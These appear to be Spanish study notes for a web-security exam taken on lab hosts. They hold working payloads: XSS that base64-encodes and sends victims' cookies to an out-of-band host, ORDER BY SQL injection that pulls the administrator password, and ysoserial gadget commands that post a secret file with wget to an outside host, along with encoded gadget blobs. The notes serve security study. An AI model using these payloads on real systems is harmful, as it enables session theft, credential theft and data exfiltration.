
---

>[!TIP] En XSS importante las evasiones de WAF, encodeando en base64 y jugando con btoa() o atob(), usando backticks... 

>[!TIP] HTTP Request Smuggling: Fijarse en la respuesta y que haya Servidores de backend ASP, Nginx, cabeceras como X-Forwarded

>[!TIP] CSRF: probar que sea necesario el campo csrf, comprobar si estan enlazados con la cookie...

---
# Índice de contenidos

[[#Examen 1]]
- [[#1 - XSS exfiltrated data OOB]]
- [[#2 - SQLi Error Based]]
- [[#3 - Deserialización insegura - Java (Ysoserial)]]

[[#Examen 2]]
- [[#1 - XSS exfiltrated data OOB]]
- [[#2 - SQLi Error Based]]
- [[#3 - Deserialización insegura - Java (Ysoserial)]]

---
# Examen 1:

## 1 - XSS exfiltrated data OOB

Aquí teníamos un campo de búsqueda que hemos usado para romper la sintaxis de la respuesta que era un json que interactuaba con un .js con una DOM vulnerability y hemos hecho una xss a medida para que mandara a mi Collaborator su cookie, con una técnica de evasión de WAF


```javascript
<script>
  // Toda la URL de la búsqueda con el payload incluido
  var target = 'https://0ad10022047011f580ff0dcf00420044.web-security-academy.net/?SearchTerm=pwned"-eval(atob(\'ZmV0Y2goJ2h0dHBzOi8venBzMWxtdGEwbjJ4bG12cHBianFvMTUwc3J5aW1iYTAub2FzdGlmeS5jb20vP2M9JyArIGJ0b2EoZG9jdW1lbnQuY29va2llKSk=\'))-"';
  
  // Forzamos al navegador del admin a ir allí
  window.location.href = target;
</script>
```

## 2 - SQLi Error Based

En el apartado de busqueda avanzada habia un campo Order que ordenaba en la query por order by y que hemos utilizado para sacar datos de la BBDD:

```http
GET /advancesearch?search=&organize_by=DATE,(SELECT+CAST(password+AS+numeric)+FROM+users+WHERE+username='administrator')&autor=
```


---
## 3 - Deserialización insegura - Java (Ysoserial):


Uso de Ysoserial para crear un gadget con la biblioteca CommonsBeanutils1 que envia a mi Collaborator el contenido del comando:

```bash
java -jar ysoserial-all.jar CommonsBeanutils1 'wget --post-file=/home/carlos/secret http://1mo3ioqcxpzziosrmdgsl322ptvkjk79.oastify.com' > wget.bin
```

Como el formato del archivo estaba en Gzip, hay que convertirlo:

```bash
cat wget.bin | gzip | base64 -w 0 | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))"

H4sIAAAAAAAAA61WTWwbRRR%2BYyd2YpwmTZOmP9CmP6FJS3bruG2aOhDyQ1uDQwIJLZIP0Xg9dbbd3dnOzDZODxw4cUVw4YiE4EA4REJQcUDiypkTCAkJiQMS5VAOSBU/b3Y3cdqGJi215J3ZN%2B//ffPervwGzVJAz1V6gxqBsh1jVthc2Gr5tYAF7P3vT35%2Bd%2Bzt1SQkitAk7ZusBBmLuz4VVHGhYHdJS5pa0pxcpxfqPgAkUPEJLmoG9am1yAyUc7knjQqjnhaQxgTuGlI/f/jOr/LwRxcTkLjHynV4C0gJWnzBfSbUsoLOyKpDvZo5p4Tt1dAiWhvbxJrFHYdZyo72azqlEdutOKzhwd0/Pui75a0OJwDqvoIOHig/ULORXZvJpSYMK4mGzqEmQwaescFgnaI/hu0pJjzqGHXpKMtQgtaNeeb6DlVMFnFtvTzzjbfyaT4JqSK0LdhelXnq1cCtMFGEHQso4EmHqSLS62XILFSWFbN4lUkFyXJ5ogypBcuhEl87yxvSMKlphRI0L3jUZTplTSXYuXB/BPdWrEGPKgb/4C8QoaFX/trbXav9EOVCVxPpifLEyp2eP1Mt8z/F5NTtb//%2B6ms8HoKRDCThcBqG09CXhmcJdEgmbOpcYkJi9t8oThEgLxNom8RSKOqpS9QJWPNnve/deffH318gkBq1PVvhJtk/cIlA0yRGTaC9ZHssys%2B8rhbB6nML1VJUju8xsUkt2pLArjkVVObjHM7SZYfTKoFs0fOYCFPEkOl0aVnyyDnTj3hklJALtFpjSh7dREuBQGtYnCtcuAREfwkxYCIGTMSAGWHADDFgrmHADDFgTs1MF8qbcrtOgzfyB2%2BYMOfiLdWovUi9qsNEQaekpcqtwEW8EBh8JPMouhjpwfAn/r8zBDIv1S3mh9cqDccIfPxo%2BdjSg6pyzan56fG6LYtICrvKk8mhHavTOHgcLwik41wSGH8SmZzjgbDYeVvDOBsj0NCXNAsZeCoN/QTyjwFYAi9utyIi8JTtMnO8IhHillrTRKArbBY2bzgf3raR7Wpe07SOFgIHt4gFSzRqOXEr2NnocK9HTqbhOOYMGeN3At39A6UH2ApZeA4GM3ACDAJvLiF/7%2BCgz6UavIKJft5c5BivRYXDJdbIEni%2BqJR/zjRzLs/b/LpV92/etLkUbrUmnfzQkK9uXLt6bXjE4FQq%2B8qyniYtcBJbD6szi8Cx/gen0kbHsNlaDHt0FntlXjt2CnvhnKLWtWnqx13sQCM3s0vYsnInc7mhM/lcfnhk%2BFRuiEBv6eEcBTgECezD6BX%2B90EzpHBN6/4NLSENIYXPLFJMXAmuzce/BLIasrThMxUSTdiBz2zEAO1wFldsr9CFXFp4TE9CTbtf8FQo2BsdxoJ61w27w3MCPbAHJfbiPvJRq90fqy2G1E3Ung3VHo8ON1X7NDyDEnp3AA6i%2BYaBFhhYD/oonmiu9k8gSUq3wOzMfQGnL6%2BGgmfCoIjm6A3tH4KduGbwKAFHoANaAz1ZO5D3u/W5t1/Pve409KRhTxr2bnfuXf/Fvj3qXtjzZOZe8jznD8y5vi3nHEptpwPtI3BkG6ow9AbcZypX8bPrPzvIVl3goTgm28fx6H047gzPd4XPrg3V3a2ri998TXirhL9EoK4r3Vb/Fx/hf8UhCwAA
```

---
# Examen 2:


## 1 - XSS exfiltrated data OOB

Aquí teníamos un campo de búsqueda que hemos usado para romper la sintaxis de la respuesta que era un json que interactuaba con un .js con una DOM vulnerability y hemos hecho una xss a medida para que mandara a mi Collaborator su cookie, con una técnica de evasión de WAF


```javascript
<script>
let payload = '"};location=atob`Ly9xZjlzYmRqMXFlc29iZGxnZjI5aGVzdnJpaW85Y2UwMy5vYXN0aWZ5LmNvbS8=`+btoa``+document["cookie"]//';
location = "https://0af9003d03fd0cff803a037400c8006e.web-security-academy.net/?find=" + encodeURIComponent(payload);
</script>
```

## 2 - SQLi Error Based

En el apartado de busqueda avanzada habia un campo Order que ordenaba en la query por order by y que hemos utilizado para sacar datos de la BBDD:

```http
GET /filtered_search?find=&organize=5&order=ASC,(SELECT+CAST(password+AS+numeric)+FROM+users+WHERE+username='administrator')&BlogArtist=
```


---
## 3 - Deserialización insegura - Java (Ysoserial):


Uso de Ysoserial para crear un gadget con la biblioteca CommonsBeanutils1 que envia a mi Collaborator el contenido del comando:

```bash
java -jar ysoserial-all.jar CommonsCollections2 'wget --post-file=/home/carlos/secret http://moeok9sxza1kk9ucoyidno4nrex5l99y.oastify.com' > wget.bin
```

Como el formato del archivo estaba en Gzip, hay que convertirlo:

```bash
cat wget.bin | gzip | base64 -w 0 | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))"

H4sIAAAAAAAAA61WXWwUVRQ%2Bd7e7226Xnxb6AwgUAWnBzkB/aJetQlsEV7dQ7QrEfWims7fbobNzhzt36C4aE42RB18w4gNP%2BmD0gWrSxCjxwcRXf3gyMdGYEB%2BML6IJJmqI4rkzs90NVFqQTfbeO%2Bee893zd8%2B5879AxOHQdlo7qymuMExlnBuMG6L8jEtdevG7vR/dPPjKQhhCaahzjHM0A3GdFW2Na4JxAa0ZKalKSXV0kZ4q2QAQQuARxguKZmv6DFVQrsgsB2fTpLowcN2nVMEcJcs1y5lmvGhYhSqY%2Bterv%2B1ZqP8qBKEMNOSpzpBM82fgJSAZaBQVIYrqdGfwPNU/Tw3OU2vPU7NVdtQSNTx0LxoGWk2ZtKrfzd8v7bxiLQyEADzA1HKA066le2hp6yybpbxGpfM/35p94cWrgyEI5yBiDPOCI2BdzneyqVkF9fjUaQRKoeHGGBUzLH9MK1IBzTUsE4KjA1M5ZBlHFYvZsk0RprkWZtTUHAcd4PIKvCLpSgB/4eqpt9c6XaZnE4YSBKy26FyNpijYXCvoA15u/fbDL79%2B/tKi3FwdDmH0ygF0heK4llLjnZKGoophCcotzVRKjil0BeNZUrK0aJsYZSeNc8PJ459b85d7wxBNw6pJw8pTSxxzi1OUp2H1pJcAJhVppJdyEJ%2BcKgtMkry0OZzLjeQgOqlL7WTGNGYgMmmhy%2BRHPANNk8wVtivGObMxgQwpVJvTVbqf03ALf2i7BH767w0thcL3AxVjQ0gP5Ubmb7T9Ga3PXgvI0etf/PPpZ7jdA8k4hOHhGAzEYGcMHiGw1qHc0MwTlDuYGs%2BlDxMgTxFYNYp5IjRLnNBMl0Y%2B6Hjzxhs//Po4geiQYRkCF%2BHOrhME6kbRSgJrMoZFfX9kZWoSzAamI6yG4PgdEOvEjOEQWDch3Kls4LNxrWwyLU8gkbYsyr0gUmTqz5Qd5iun2j6P4zvkqJYvUOHsWAIlRaBh8TYS4J0ZjLmKMVdrLqUXc7USc9WLuXr4%2BFgqtyR30azy%2BvpgDeLqRLDU5JV6UrPyJl5n6ZL6PNPdIuYHwVpwL8ej6IyPg%2BaP/H9lCMSfKOnU9u58DHYReO/e/LGsBnlRVA9nx4ZLhpNGkld3H4wPjQBO5sH9aEEgFviSwPCD8OQEc7lOjxgyjRNBBirykiYgDo0x6CTQex8JS%2BDQSiPCXUsYRaoOTzmY4rqoIBFY7xULg1WV925bcqXIFaTFbCGwdRlbMERDuhmUgqZqUX/WVzIGu9FnyBh8E2jp7MrcwZZKwKPQHYc9oBA4NYf8Hd3dNnNE9zQ6%2BjF1hqG9usZN5mCMdI77M0LYB1S1yCibTTqlc9q%2B2dmkq7OykbdYn8Vpqd9MJssK0xxhTJdl%2B6uHvVh6aInqBHZ13tmlahXDYqtT7CIJrJW9UrE%2BrIUTQtNnxzQ7qGJbqr4Zn8OStW/vYP9AT09/b0%2Byb3B/D4GOzN05UrANsL0CaoX/jRCBKM4xWb%2Bh3qNhSuGYQIqKM8E5svsTIAseyyocox5RhdU4JnwGWAODOGN5hfXIJYUPys4nabcL9nmCHf5mIChXLdDq7RNog3aU2IBrX0cJuymATXvUJWAHPdjd/uaSsA/BZpSQqy2wFY%2BvHlAPXYtG78AdybXmfQiTzBVQm/d9DP0nFzzB/Z5RRHJ0eOdvgyac47gVgu2wFhpc2Vnbkfebxb63Sfa9lhi0xaA9BhtW2vfO/GRcHyoebX8wfS98hLE7%2BtzOZfscSq2kAm0ksH0FUGj67U%2B5/6wgy1WBu%2BYxWXkeD92Wx83e/jpvXF8T3VYZXVtAHd4qbs8RKOGzrqn6AkxjXStQ3vzjO%2B/%2B8fJ5fMKSNETOykiWuG%2B2z%2BdH7LX5tzY3Xrz2euXxREr/AoCKzmKLDAAA
```
